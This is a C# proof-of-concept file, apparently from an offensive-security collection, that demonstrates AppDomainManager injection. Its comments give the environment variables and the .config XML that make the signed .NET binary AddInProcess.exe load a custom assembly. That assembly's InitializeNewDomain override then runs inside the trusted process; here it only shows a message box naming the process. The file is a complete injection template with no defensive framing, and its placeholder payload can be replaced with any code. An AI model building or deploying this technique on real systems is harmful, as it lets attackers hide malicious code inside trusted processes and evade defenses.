using System;
using System.Diagnostics;

//  Environmental variables
//  $env:APPDOMAIN_MANAGER_ASM='AppDomainManagerInjection, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
//  $env:APPDOMAIN_MANAGER_TYPE='AppDomainManagerInjection.MyAppDomainManagerInjection'
//  Start-Process -NoNewWindow .\AddInProcess.exe

//  .config XLM file
//  < configuration >
//     < runtime >
//        < assemblyBinding xmlns = "urn:schemas-microsoft-com:asm.v1" >
//        </ assemblyBinding >
//        < appDomainManagerAssembly value = "AppDomainManagerInjection, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
//        < appDomainManagerType value = "AppDomainManagerInjection.MyAppDomainManagerInjection" />
//     </ runtime >
//  </ configuration >


namespace AppDomainManagerInjection
{
    public sealed class MyAppDomainManagerInjection : AppDomainManager
    {
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            System.Windows.Forms.MessageBox.Show("App Domain Manager Injection; Process: " + Process.GetCurrentProcess().ProcessName);
            return;
        }
    }
}
